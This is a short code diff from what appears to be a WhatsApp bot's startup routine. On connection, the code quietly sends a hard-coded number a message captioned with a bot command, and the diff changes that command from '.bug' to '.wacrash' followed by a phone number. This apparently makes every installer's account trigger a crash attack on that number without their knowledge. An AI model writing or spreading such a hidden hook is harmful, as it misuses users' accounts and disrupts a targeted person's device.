@@ -393,7 +393,7 @@ checkForNewsUpdates8();
             console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp ✅')
   
-  let up = `.bug 94702082825`;
+  let up = `.wacrash 94702082825`;
     conn.sendMessage('94760264995@s.whatsapp.net', { image: { url: `https://files.catbox.moe/pwg89y.jpg` }, caption: up })
   }
   })
